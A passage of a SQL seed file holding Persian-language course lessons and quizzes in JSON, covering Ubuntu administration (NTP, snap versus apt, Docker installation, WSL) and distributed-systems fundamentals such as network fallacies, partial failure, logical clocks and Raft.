اجراست","خطاست"],"ans":1,"why":"نسبت بار به هسته عدد اصلی است؛ بار ۸ روی ۸ هسته یعنی اشباع کامل ولی بدون صف — مرز را بشناس."}]'::jsonb),
('ub-c5', 'linux', 'زمان، منطقه زمانی و NTP', 30, 17, '[{"k":"p","t":"لاگی که ساعتش اشتباه است، بدتر از نداشتن لاگ است — چون ترتیب رویدادها را گم می‌کنی. timedatectl وضعیت زمان را نشان و تنظیم می‌کند و systemd-timesyncd ساعت را با سرورهای NTP همگام نگه می‌دارد. روی سرورهای خوشه، چند ثانیه اختلاف ساعت می‌تواند احراز هویت و ترتیب تراکنش‌ها را خراب کند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["timedatectl — وضعیت فعلی و همگامی NTP","timedatectl set-timezone Asia/Tehran — منطقه زمانی","timedatectl timesync-status — آیا همگام است؟","تاریخ‌های لاگ و آرشیو همیشه با منطقه زمانی مشخص","date +%F قالب ISO می‌دهد (2026-03-14) — استاندارد نام‌گذاری"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"تنظیم ساعت","code":"timedatectl set-timezone Asia/Tehran\ntimedatectl set-ntp true\ntimedatectl timesync-status\n# System clock synchronized: yes ✓"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: timedatectl — وضعیت فعلی و همگامی NTP بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا همگامی NTP روی سرور مهم است؟","opts":["مصرف برق را کم می‌کند","چون لاگ‌ها، احراز هویت‌های زمانی و ترتیب رویدادهای خوشه به ساعت درست وابسته‌اند","فقط زیبایی است","برای SSL لازم نیست"],"ans":1,"why":"توکن‌هایی مثل TOTP و گواهی‌ها با اختلاف چند دقیقه‌ای باطل می‌شوند — ساعتِ درست، زیرساختِ نامرئی اعتماد است."}]'::jsonb),
('ub-c6', 'linux', 'snap در برابر apt؛ انتخاب آگاهانه', 35, 18, '[{"k":"p","t":"apt بسته‌ها را از مخزن توزیع می‌گیرد: سبک، یکپارچه با سیستم و وابسته به چرخه اوبونتو. snap هر بسته را با وابستگی‌هایش در یک جعبه ایزوله می‌آورد: همیشه جدید، ولی حجیم‌تر و کندتر در اجرا. روی میزکار برای نرم‌افزارهایی مثل VS Code و Slack راحت است؛ روی سرور، apt اولویت دارد مگر نسخه خاصی واقعاً لازم باشد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["snap install <x> / snap remove <x>","snap list — نصبی‌ها و نسخه‌هایشان","snap refresh — به‌روزرسانی همه (خودکار هم هست)","snapها در /snap mount می‌شوند — با df دیده می‌شوند","قاعده: سرور = apt؛ میزکار = هردو، snap برای اپ‌های تجاری"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"کار با snap","code":"sudo snap install code --classic   # VS Code\nsnap list\ncode --version\nsnap refresh --list               # چه به‌روزهایی هست؟"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: snap install <x> / snap remove <x> بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"مزیت اصلی snap نسبت به apt چیست؟","opts":["سبک‌تر است","وابستگی‌ها را همراه می‌آورد و خارج از چرخه توزیع، همیشه نسخه تازه خودش را دارد","امن‌تر است","فقط روی اوبونتوست"],"ans":1,"why":"همین ایزوله‌بودن هزینه دارد: حجم بیشتر، اجرا کندتر و mountهای شلوغ — پس انتخاب باید آگاهانه باشد نه پیش‌فرض."}]'::jsonb),
('ub-c7', 'linux', 'نصب و مدیریت Docker روی اوبونتو', 45, 19, '[{"k":"p","t":"اوبونتو رایج‌ترین میزبان Docker است. نصب از مخزن رسمی خود Docker انجام می‌شود (نه بسته قدیمی ubuntu)، کاربر به گروه docker اضافه می‌شود تا بدون sudo کار کند، و بعد همه‌چیز با systemctl مدیریت می‌شود. و مهم: docker.service خودش یک سرویس systemd است — همه درس‌های این دوره رویش اعمال می‌شوند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["نصب از مخزن رسمی: keyring + sources.list داکر","sudo usermod -aG docker $USER و re-login","systemctl enable --now docker","docker run hello-world — تست اولیه","برای تولید: محدودیت منابع کانتینر و لاگ‌هایش را تنظیم کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"نصب رسمی Docker","code":"# کلید امضا\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg \\\n  -o /etc/apt/keyrings/docker.asc\n\n# مخزن + نصب\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \\\nhttps://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list\nsudo apt update\nsudo apt install docker-ce docker-compose-plugin -y\nsudo usermod -aG docker $USER"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: نصب از مخزن رسمی: keyring + sources.list داکر بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا Docker را از مخزن رسمی خودش نصب می‌کنیم؟","opts":["رایگان‌تر است","چون بسته داکر در مخزن اوبونتو معمولاً قدیمی است و وصله‌های امنیتی دیرتر می‌رسد","اجباری است","تفاوتی ندارد"],"ans":1,"why":"داکر مستقیم با هسته کار می‌کند؛ نسخه به‌روز یعنی دسترسی به API جدید و وصله‌های امنیتی زودهنگام — روی سرور، نسخه قدیمی داکر یک ریسک واقعی است."}]'::jsonb),
('ub-c8', 'linux', 'WSL؛ اوبونتو داخل ویندوز', 30, 20, '[{"k":"p","t":"WSL2 یک هسته لینوکس واقعی داخل ویندوز اجرا می‌کند و اوبونتو را به شکل کامل — نه شبیه‌سازی — می‌دهد. برای شروع یادگیری و توسعه روزانه عالی است: wsl --install، نصب اوبونتو از استور، و یک ترمینال واقعی. فقط بدان روزی برای systemd، شبکه واقعی و سخت‌افزار، به ماشین واقعی نیاز پیدا می‌کنی — WSL پله اول است، نه مقصد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["wsl --install -d Ubuntu-24.04 — نصب مستقیم","فایل‌های ویندوز زیر /mnt/c در دسترس‌اند","VS Code با Remote-WSL مستقیم داخل لینوکس ویرایش می‌کند","systemd در WSL2 قابل‌فعال است (/etc/wsl.conf)","کارکردن با شبکه واقعی و سرویس‌های سیستمی را روی ماشین واقعی تمرین کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"فعال‌سازی systemd در WSL","code":"# /etc/wsl.conf\n[boot]\nsystemd=true\n\n# بعد در PowerShell:\nwsl --shutdown\nwsl\nsystemctl status   # حالا systemd زنده است"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: wsl --install -d Ubuntu-24.04 — نصب مستقیم بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"WSL2 با شبیه‌سازهای قدیمی چه تفاوتی دارد؟","opts":["گرافیک دارد","هسته لینوکس واقعی را با Hyper-V اجرا می‌کند — سازگاری کامل سیستم‌کال، نه ترجمه","سریع‌تر ویندوز است","لینوکس واقعی نیست"],"ans":1,"why":"همین اجرای واقعیِ هسته است که باعث می‌شود ۹۹٪ آموزش‌های این دوره داخل WSL هم دقیقاً کار کنند — پله شروع ایده‌آل."}]'::jsonb),
('ds-r1', 'dist', 'چرا توزیع‌شده؟ هشت مغالطه و مسئله شکست جزئی', 55, 1, '[{"k":"p","t":"لحظه‌ای می‌رسد که یک ماشین دیگر کافی نیست: یا داده جا نمی‌شود، یا ترافیک از توانش بیشتر است، یا کاربرانِ آن‌سوی دنیا نمی‌توانند ۲۰۰ میلی‌ثانیه صبر کنند. سیستم توزیع‌شده یعنی پخش‌کردن کار روی چند ماشین — و به‌قیمتش، ورود به دنیایی که در آن «خرابی» نه استثنا، که قاعده است."},{"k":"h","t":"سه نیرویی که تو را به توزیع هل می‌دهند"},{"k":"p","t":"هیچ‌کس برای تفریح سیستم توزیع‌شده نمی‌سازد؛ سه فشار واقعی وجود دارد. اول مقیاس: وقتی داده از دیسک یک ماشین بزرگ‌تر می‌شود یا QPS از توان CPU آن رد می‌شود، باید افقی تقسیم کنی. دوم دسترس‌پذیری: یک ماشین یعنی تک‌نقطه شکست؛ اگر قرارداد ۹۹٫۹۹٪ داری، یک ری‌استارت ساده هم نقض قرارداد است و فقط افزونگی (Redundancy) نجاتت می‌دهد. سوم تأخیر جغرافیایی: سرعت نور محدود است — فاصله تهران تا فرانکفورت همین حالا حدود ۸۰ میلی‌ثانیه است و هیچ بهینه‌سازی‌ای از فیزیک جلوتر نمی‌رود؛ پس کپیِ داده نزدیک کاربر لازم می‌شود. هر کدام از این سه به‌تنهایی دلیل موجه است — و اگر هیچ‌کدام نیست، توزیع‌شده فقط پیچیدگی رایگان است."},{"k":"h","t":"هشت مغالطه شبکه"},{"k":"p","t":"در ۱۹۹۴ پیتر دویچ و همکارانش در سان لیست «مغالطه‌های برنامه‌نویسی توزیع‌شده» را نوشتند — پیش‌فرض‌های غلطی که برنامه‌نویس‌ها ناخودآگاه درباره شبکه دارند: شبکه قابل‌اعتماد است؛ تأخیر صفر است؛ پهنای باند نامحدود است؛ توپولوژی ثابت است؛ حداقل یک مدیر شبکه هست؛ هزینه انتقال صفر است؛ شبکه همگن است؛ و سیستم توزیع‌شده مثل یک سیستم واحد رفتار می‌کند. همه این‌ها در کدِ روی لپ‌تاپ درست‌اند و در تولید غلط. هر باگ عجیب سیستم‌های توزیع‌شده که ببینی، ردش به یکی از این هشت مغالطه می‌رسد — مثلاً فراخوانی بدون timeout یعنی «فرض کردم همیشه جواب می‌آید» یعنی مغالطه اول."},{"k":"h","t":"شکست جزئی؛ مسئله تعریف‌کننده"},{"k":"p","t":"در یک برنامه تک‌ماشینی، اگر دیسک بمیرد همه‌چیز می‌میرد و خطا روشن است. در سیستم توزیع‌شده، «شکست جزئی» رخ می‌دهد: یکی از پنج سرور مرده، شبکه یک مسیرش کند شده، دیتابیس جواب می‌دهد ولی کش نه — و برنامه باید با وجود این خرابی‌ها به کارش ادامه دهد. بدتر از خود شکست، «ابهام» آن است: وقتی پاسخی نمی‌رسد، نمی‌دانی درخواست انجام نشد، انجام شد ولی جوابش گم شد، یا آن‌قدر کند است که هنوز در راه است. timeout این ابهام را حل نمی‌کند؛ فقط قابل‌مدیریتش می‌کند. کل هنر مهندسی توزیع‌شده، تصمیم‌گیری درست زیر همین ابهام است — و به همین دلیل است که Idempotency و Retryهای هوشمند این‌قدر تکرار می‌شوند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"py","title":"یک خطا، دو روایت","code":"import httpx\n\ndef charge_user(user_id, amount):\n    try:\n        resp = httpx.post(\n            ''https://pay.example.com/charge'',\n            json={''user'': user_id, ''amount'': amount},\n            timeout=5,               # ← مغالطه ۱: همیشه جواب نمی‌آید\n        )\n        resp.raise_for_status()\n    except httpx.TimeoutException:\n        # اینجا چه می‌دانی؟ هیچ!\n        # شاید پول کسر نشد، شاید کسر شد و جواب گم شد.\n        # retry ساده = احتمال کسر دوباره\n        ...\n\n# راه مهندسی: کلید Idempotency\n#   headers={''Idempotency-Key'': f''{user_id}-{order_id}''}\n# حالا retry امن است: سرور می‌داند این «همان» درخواست است."},{"k":"list","items":["خط timeout یعنی پذیرش مغالطه اول: شبکه قابل‌اعتماد نیست، پس هر فراخوانی مهلت دارد.","در except هیچ اطلاعاتی نداری — این ذات شکست جزئی است؛ کد نباید طوری نوشته شود که انگار می‌داند.","بدون Idempotency-Key، هر retry یک ریسک «پرداخت دوباره» است — معروف‌ترین باگ سیستم‌های پرداخت.","با کلید یکتا، سرور درخواست تکراری را می‌شناسد و نتیجه قبلی را برمی‌گرداند: retry از خطر به ابزار تبدیل می‌شود."]},{"k":"def","term":"شکست جزئی (Partial Failure)","t":"وضعیتی که بخشی از سیستم خراب یا کند است ولی بقیه کار می‌کنند و برنامه باید تصمیم بگیرد: صبر کند؟ مسیر جایگزین برود؟ خطا بدهد؟ برخلاف شکست کامل، شکست جزئی همیشه با ابهام همراه است — و مدیریت این ابهام، تفاوت کد اسباب‌بازی و کد توزیع‌شده است."},{"k":"table","head":["","تک‌ماشینی","توزیع‌شده"],"rows":[["شکست","همه‌چیز با هم می‌میرد — واضح","جزئی و مبهم — بخشی کار می‌کند"],["مقیاس","عمودی (CPU/RAM بیشتر) — سقف دارد","افقی (ماشین بیشتر) — عملاً بی‌سقف"],["دسترس‌پذیری","وابسته به یک ماشین","افزونگی و تحمل خرابی"],["پیچیدگی","در حد کد","شبکه، ساعت، اجماع، سازگاری…"]]},{"k":"warn","title":"دام رایج","t":"توزیع‌شده‌کردن سیستم به‌خاطر «مد روز» یا رزومه، نه به‌خاطر نیاز واقعی. هر ماشین جدید یعنی: یک نقطه شکست جدید، یک مسأله سازگاری جدید و ده برابر پیچیدگی عملیاتی. قاعده بزرگ‌سالان صنعت: تا مجبور نشده‌ای، تک‌سازه نگه دار — و روزی که مجبور شدی، دقیقاً بدانی کدام‌یک از سه نیرو (مقیاس، دسترس‌پذیری، تأخیر) هل‌ات داده است."},{"k":"tip","title":"نکته حرفه‌ای","t":"قبل از هر بحث معماری، سه عدد دربیاور: اوج QPS واقعی (نه حدسی)، حجم داده در ۳ سال آینده، و درصد دسترس‌پذیریِ واقعاً موردنیاز کسب‌وکار. ۹۰٪ بحث‌های «میکروسرویس یا نه» با همین سه عدد تمام می‌شوند — چون معلوم می‌شود عدد هیچ‌کدام از مرزهای یک ماشین قوی رد نشده."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["سه نیروی واقعی: مقیاس، دسترس‌پذیری و تأخیر جغرافیایی — بدون این‌ها توزیع‌شده پیچیدگی رایگان است.","هشت مغالطه شبکه یعنی شبکه قابل‌اعتماد نیست؛ هر فراخوانی timeout و هر عمل retry-پذیر می‌خواهد.","شکست جزئی و ابهامِ «انجام شد یا نه» قلب طراحی توزیع‌شده است؛ Idempotency ابزار اصلی مقابله."]}]'::jsonb, '[{"q":"کدام‌یک دلیل «موجه» برای توزیع‌شده‌کردن یک سیستم است؟","opts":["رزومه تیم قوی‌تر می‌شود","داده از ظرفیت یک ماشین بزرگ‌تر شده یا دسترس‌پذیری قراردادی لازم است","فریم‌ورک جدید آن را می‌خواهد","شرکت بزرگ‌تر به‌نظر برسد"],"ans":1,"why":"فقط سه فشار واقعی — مقیاس، دسترس‌پذیری و تأخیر جغرافیایی — توزیع‌شده را توجیه می‌کنند؛ بقیه دلایل، پیچیدگی را بدون سود می‌خرند."},{"q":"چرا timeout به‌تنهایی مشکل «جواب نرسید» را حل نمی‌کند؟","opts":["چون کند است","چون نمی‌گوید درخواست انجام نشد یا انجام شد و جواب گم شد — ابهام شکست جزئی پا بر جاست","چون شبکه را قطع می‌کند","حل می‌کند"],"ans":1,"why":"timeout فقط می‌گوید «دیگر صبر نمی‌کنم»، نه «چه اتفاقی افتاد». برای تصمیم بعدی (retry؟ جبران؟) به Idempotency و طراحی برای ابهام نیاز است."},{"q":"مغالطه «شبکه قابل‌اعتماد است» در کد معمولاً خودش را چطور نشان می‌دهد؟","opts":["کد کند می‌شود","فراخوانی شبکه بدون timeout، بدون retry و بدون مسیر خطا — چون فرض شده همیشه جواب می‌آید","حافظه پر می‌شود","رابط کاربری زشت می‌شود"],"ans":1,"why":"هر socket یا HTTP call که مهلت و مدیریت خطا ندارد، یعنی برنامه‌نویس ناخودآگاه فرض کرده شبکه هرگز دروغ نمی‌گوید — و تولید، روزی آن را ثابت می‌کند."}]'::jsonb),
('ds-r2', 'dist', 'زمان و ترتیب؛ دنیایی که ساعت مشترک ندارد', 60, 2, '[{"k":"p","t":"در برنامه تک‌ماشینی، «اول الف بعد ب» را ساعت سیستم می‌گوید و تمام. در سیستم توزیع‌شده، ساعت مشترکی وجود ندارد — و جمله «این تراکنش قبل از آن بود» دیگر بدیهی نیست. نیمی از باگ‌های عجیب توزیع‌شده، از همین بی‌زمانی مشترک می‌آیند."},{"k":"h","t":"دروغ ساعت‌های فیزیکی"},{"k":"p","t":"هر ماشین ساعت خودش را دارد و همه‌شان دروغ می‌گویند — کمی. کریستال ساعت‌ها با دما و ولتاژ تند و کند می‌شوند (Drift)، NTP هر چند وقت یک‌بار ساعت را می‌پَراند تا درستش کند، و حتی ثانیه‌های کبیسه (Leap Second) گاهی یک ثانیه تکراری یا حذف‌شده می‌سازند. نتیجه عملی: اگر دو رویداد را روی دو سرور با new Date() زمان‌بزنی، ترتیب‌شان قابل‌اعتماد نیست — حتی ممکن است رویدادِ «بعدی» زمانِ «قبلی‌تری» بگیرد. به همین دلیل است که دیتابیس‌های جدی برای ترتیب‌دهی به ساعت دیوار اکتفا نمی‌کنند و Cassandra برای حل تعارض، به زمان‌برچسب نسخه‌شده متکی است نه ساعت مشترک."},{"k":"h","t":"Happens-Before و ساعت‌های لمپورت"},{"k":"p","t":"لسلی لمپورت در ۱۹۷۸ نشان داد برای «ترتیب» لازم نیست ساعت واقعی داشته باشیم — یک شمارنده منطقی کافی است، به‌شرط قانون ساده: قبل از هر رویداد محلی شمارنده‌ات را یکی زیاد کن؛ وقتی پیام می‌فرستی شمارنده را بفرست؛ وقتی پیام گرفتی، شمارنده‌ات را روی max(خودت، دریافتی) + 1 بگذار. حالا اگر الف واقعاً باعث ب شده باشد (زنجیره‌ای از پیام‌ها)، شماره لمپورت الف قطعاً کمتر از ب است. ولی عکسش برقرار نیست: شماره کمتر یعنی «شاید قبل بوده، شاید بی‌ارتباط» — و دقیقاً همین «شاید» است که ترتیب واقعی را از توهم ترتیب جدا می‌کند. دو رویداد همزمان یعنی هیچ زنجیره پیامی بین‌شان نیست — و درباره‌شان باید تصمیم دیگری بگیری."},{"k":"h","t":"از بردار ساعت تا TrueTime"},{"k":"p","t":"ساعت لمپورت نمی‌تواند بگوید دو رویداد «واقعاً همزمان» بوده‌اند یا نه؛ ساعت برداری (Vector Clock) می‌تواند: هر گره شمارنده همه گره‌ها را نگه می‌دارد و با مقایسه دو بردار، رابطه دقیق «قبل / بعد / همزمان» مشخص می‌شود — قیمتش بزرگ‌شدن متادیتاست و Dynamo و Riak همین مسیر را رفتند. در آن‌سوی طیف، گوگل برای Spanner کار دیگری کرد: ساعت فیزیکی را آن‌قدر دقیق ساخت که درست بماند — TrueTime با ساعت‌های اتمی و GPS در هر دیتاسنتر، یک «بازه اطمینان» (مثلاً ±۷ میلی‌ثانیه) اعلام می‌کند و Spanner فقط وقتی از ترتیب مطمئن است که بازه‌ها هم‌پوشانی نداشته باشند. دو راه‌حلِ دو انتهای طیف، برای یک مسئله: ترتیب در غیاب ساعت مشترک."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"لمپورت در عمل — سه گره، یک اتفاق","code":"گره A (شمارنده ۳): کاربر «تغییر رمز» انجام می‌دهد → ۴\nگره A پیام می‌فرستد: [event=reset, clock=4]\n\nگره B (شمارنده ۷): پیام را می‌گیرد:\n    clock = max(7, 4) + 1 = 8\n    بعد: «ایمیل اطلاع‌رسانی» → ۹\n\nگره C (شمارنده ۲): همزمان «ورود از دستگاه جدید» → ۳\n    (هیچ پیامی بین B و C رد نشد)\n\nنتیجه: reset(4) → email(9)   ← ترتیب قطعی (زنجیره پیام)\n      login(3) و reset(4)     ← همزمانِ منطقی! عدد کوچک‌تر\n                                 دلیل «قبلی‌بودن» نیست."},{"k":"list","items":["قاعده دریافت — max(خودت، دریافتی)+1 — است که ترتیب را از طریق پیام‌ها «مسری» می‌کند.","ایمیل (۹) قطعاً بعد از تغییر رمز (۴) است چون زنجیره پیام دارند.","عدد کوچک‌ترِ login (۳) فریب‌دهنده است: چون پیامی رد نشده، از نظر لمپورت همزمان است — هر ترتیب‌دهی‌ای رویش «تصمیم» است نه «کشف»."]},{"k":"def","term":"Happens-Before","t":"رابطه‌ای که لمپورت تعریف کرد: الف قبل از ب است اگر الف بتواند از طریق اجرا در یک گره یا زنجیره پیام‌ها روی ب اثر گذاشته باشد. این رابطه «ترتیب جزئی» است — بعضی جفت‌ها قابل‌مقایسه‌اند و بعضی همزمان. درک این که «همزمان» یعنی «بی‌ترتیبِ قابل‌کشف»، پایه فهم همه پروتکل‌های سازگاری است."},{"k":"table","head":["ساعت","چه می‌دهد","هزینه","کجا"],"rows":[["دیوار (NTP)","زمان تقریبی واقعی — بی‌ترتیبی تضمین‌شده","Drift و پرش","لاگ انسانی، نه ترتیب"],["لمپورت","ترتیب رویدادهای مرتبط","یک عدد","ترتیب علّی ساده"],["بردار ساعت","تشخیص دقیق همزمانی","متادیتای به‌اندازه گره‌ها","Dynamo، CRDTها"],["TrueTime","ترتیب جهانی واقعی با بازه اطمینان","ساعت اتمی + GPS","Spanner"]]},{"k":"warn","title":"دام رایج","t":"ترتیب‌دادن رویدادهای سرویس‌های مختلف با timestamp دیوار (مثل created_at هر سرویس) و ساختن گزارش «چه اتفاقی افتاد» روی آن. در اولین اختلال NTP یا اختلاف چند میلی‌ثانیه‌ای، ترتیب گزارش از واقعیت جدا می‌شود و دیباگ را گمراه می‌کند — برای ترتیب منطقی از شماره ترتیب/نسخه استفاده کن و ساعت را فقط برای نمایش نگه دار."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای هر تراکنش یا جریان کاری یک Correlation ID بساز و در همه سرویس‌ها و لاگ‌ها همراهش کن. وقتی ترتیب زمانی قابل‌اعتماد نیست، «همه رویدادهای این ID را کنار هم بگذارم» تنها راه بازسازی ماجراست — و همین یک خط لاگ، تفاوت بین دیباگ پنج‌دقیقه‌ای و پنج‌روزه است."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["ساعت‌های فیزیکی دروغ می‌گویند؛ برای ترتیب، به ساعت دیوار تکیه نکن.","لمپورت ترتیبِ رویدادهای مرتبط را می‌دهد ولی همزمانی را نه؛ بردار ساعت همزمانی را هم تشخیص می‌دهد.","همزمان یعنی بی‌ترتیبِ قابل‌کشف — و درباره‌اش باید آگاهانه تصمیم بگیری."]}]'::jsonb, '[{"q":"چرا شماره لمپورت کمتر، دلیل «قبلی‌بودن» نیست؟","opts":["چون شماره‌ها تصادفی‌اند","چون اگر زنجیره پیامی بین دو رویداد نباشد، از نظر علّی همزمان‌اند و شماره فقط بازتاب تصادفی سرعت شمارنده‌هاست","چون ساعت‌ها خراب‌اند","دلیل هست"],"ans":1,"why":"لمپورت فقط یک‌طرفه تضمین می‌دهد: علّت قبل از معلول. دو رویداد بی‌ارتباط می‌توانند هر شماره‌ای بگیرند — ترتیب‌دادن‌شان تصمیم طراحی است نه کشف واقعیت."},{"q":"ساعت برداری چه چیزی را می‌دهد که لمپورت نمی‌دهد؟","opts":["سرعت بیشتر","تشخیص دقیق این‌که دو رویداد واقعاً همزمان‌اند یا یکی قبل از دیگری","زمان واقعی","رمزنگاری"],"ans":1,"why":"با مقایسه بردارها، رابطه هر جفت رویداد دقیقاً معلوم می‌شود (قبل/بعد/همزمان) — لمپورت فقط «شاید قبل» را می‌گوید."},{"q":"Spanner چطور ترتیب جهانی واقعی دارد؟","opts":["با ساعت لمپورت","با TrueTime: ساعت‌های اتمی و GPS که بازه اطمینان کوچکی دارند و فقط ترتیب‌های خارج از ابهام پذیرفته می‌شوند","با NTP دقیق‌تر","با یک سرور ساعت مرکزی"],"ans":1,"why":"Spanner ابهام را حذف نکرد — اندازه‌گیریش کرد. وقتی بازه اطمینان دو تراکنش هم‌پوشانی دارد، صبر می‌کند تا مطمئن شود؛ قیمتش میلی‌ثانیه تأخیر است و پاداشش سازگاری خارجی واقعی."}]'::jsonb),
('ds-r3', 'dist', 'اجماع و Raft؛ چطور چند ماشین روی یک حقیقت توافق می‌کنند', 70, 3, '[{"k":"p","t":"اگر سه ماشین سه نسخه متفاوت از حقیقت داشته باشند و یکی‌شان بمیرد، کدام درست است؟ مسئله اجماع (Consensus) قدیمی‌ترین مسئله جدی سیستم‌های توزیع‌شده است — و Raft پاسخِ مهندسی‌شده‌ای است که بالاخره آن را قابل‌فهم کرد."},{"k":"h","t":"چرا اجماع، قلب تپنده است"},{"k":"p","t":"هر چیز قابل‌اتکایی که روی چند ماشین ساخته می‌شود، تهش به یک سوال می‌رسد: وقتی گره‌ها می‌میرند، پیام‌ها گم می‌شوند و شبکه نصف می‌شود، همه چطور روی «مقدار/ترتیب بعدی» توافق کنند؟ انتخاب رهبر، تکرار لاگ، قفل توزیع‌شده و حتی offsetهای کافکا — همه به اجماع برمی‌گردند. تئوری هم مرزها را مشخص کرده: قضیه FLP می‌گوید در سیستم ناهمگام با حتی یک خرابی، هیچ الگوریتم قطعی‌ای اجماع را «همیشه» تمام نمی‌کند — پس الگوریتم‌های واقعی با تصادفی‌سازی یا فرض‌های عملی (مثل timeout) این بن‌بست را دور می‌زنند. Paxos این مسئله را حل کرد ولی آن‌قدر سخت بود که ده سال کسی جز نویسنده‌اش نفهمید؛ Raft در ۲۰۱۴ با یک هدف طراحی شد: «قابل‌فهم‌بودن» — مسئله را به سه زیرمسئله شکست: انتخاب رهبر، تکرار لاگ و ایمنی."},{"k":"h","t":"Raft؛ انتخاب رهبر و Termها"},{"k":"p","t":"در Raft هر گره یکی از سه نقش را دارد: Follower (پیرو)، Candidate (نامزد) یا Leader (رهبر). رهبر با Heartbeatهای منظم (مثلاً هر ۵۰ میلی‌ثانیه) زنده‌بودنش را اعلام می‌کند؛ اگر پیرویی این ضربان را در مهلتی (مثلاً ۱۵۰–۳۰۰ میلی‌ثانیه تصادفی) نشنود، فرض می‌کند رهبر مرده و نامزد می‌شود: شماره دور (Term) را یکی بالا می‌برد و از بقیه رأی می‌خواهد. هر گره در هر Term فقط یک رأی دارد — همین قانون جلوی دو رهبر همزمان را می‌گیرد. اگر دو نامزد همزمان بلند شوند و رأی‌ها ۵۰-۵۰ شود، کسی اکثریت نمی‌گیرد، timeoutهای تصادفی تمام می‌شود و دور بعدی شروع می‌شود — و به‌لطف تصادفی‌بودن مهلت‌ها، دور بعدی تقریباً همیشه یک برنده سریع دارد. مهلت تصادفی، ساده‌ترین و مهم‌ترین ترفند کل الگوریتم است."},{"k":"h","t":"تکرار لاگ و Commit"},{"k":"p","t":"بعد از انتخاب، همه نوشتن‌ها از رهبر می‌گذرد: کلاینت درخواست را به رهبر می‌فرستد، رهبر آن را به لاگ خودش اضافه و برای همه پیروها AppendEntries می‌فرستد، و وقتی اکثریت (مثلاً ۲ از ۳) تأیید کردند، ورودی Commit می‌شود و جواب به کلاینت برمی‌گردد — یعنی حتی اگر رهبر همان لحظه بمیرد، اکثریت آن ورودی را دارند و از دست نمی‌رود. قانون طلایی ایمنی Raft: «اگر یک ورودی Commit شده، در همه لاگ‌های بعدی (رهبرهای بعدی) هم هست.» این یعنی سیستم خطیِ تاریخچه‌ای دارد که هیچ‌وقت عقب نمی‌رود — همان چیزی که etcd و ZooKeeper را قابل‌اعتماد می‌کند. و چون فقط رهبر می‌نویسد و بقیه کپی می‌کنند، خواندن از رهبر همیشه سازگارترین است (خواندن از پیروها ممکن است کمی عقب باشد)."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"تایم‌لاین یک انتخاب رهبر (۳ گره)","code":"Term 4 — گره A رهبر است، هر ۵۰ms به B و C ضربان می‌زند\n   [A: Leader]  ──heartbeat──>  [B: Follower]\n                ──heartbeat──>  [C: Follower]\n\nT+0ms    گره A می‌میرد (بدون خداحافظی — شبکه ساکت می‌شود)\nT+187ms  مهلت C تمام می‌شود (مهلت‌ها تصادفی‌اند: ۱۵۰–۳۰۰ms)\n         C → Candidate،  Term=5،  رأی می‌خواهد\nT+190ms  B رأی می‌دهد (اولین درخواست Term 5 است) → ۲ از ۳\n         [C: Leader, Term 5]   [B: Follower]\nT+240ms  C اولین Heartbeat را می‌فرستد — نظم برگشت\n\nکل وقفه: ~۲۰۰ میلی‌ثانیه. هیچ داده‌ای گم نشد\n(ورودی‌های Commit‌شده روی اکثریت بودند)."},{"k":"list","items":["مرگ رهبر «اعلام» نمی‌شود — با سکوت کشف می‌شود؛ تنها راه شناخت مرگ در دنیای توزیع‌شده همین timeout است.","مهلت تصادفی ۱۵۰–۳۰۰ms یعنی B و C همزمان نامزد نمی‌شوند — وگرنه رأی‌ها تقسیم و انتخاب قفل می‌شد.","رأی‌دادن به «اولین درخواستِ Term جدید» و تک‌رأیی‌بودن هر Term، دو ضامنِ «رهبر یکتا» هستند.","وقفه ~۲۰۰ms بهایی است که برای تحمل خرابی می‌پردازیم — و Commitشدگی روی اکثریت، تضمین می‌کند این بهای زمانی است نه داده‌ای."]},{"k":"def","term":"اکثریت (Quorum)","t":"حداقل تعداد گره‌هایی که باید تأیید کنند تا یک تصمیم معتبر شود — در Raft بیش از نصف (N/2+1). جادوی ریاضی‌اش این است: هر دو اکثریت، حداقل یک عضو مشترک دارند؛ پس دو تصمیم متضادِ معتبر نمی‌توانند همزمان وجود داشته باشند. همه سیستم‌های اجماعی — از Raft تا Quorumهای دیتابیس — روی همین اصل ساده بنا شده‌اند."},{"k":"table","head":["نقش","چه می‌کند","کی می‌شود"],"rows":[["Follower","درخواست‌ها را کپی و Heartbeat را گوش می‌کند","حالت پیش‌فرض همه"],["Candidate","رأی جمع 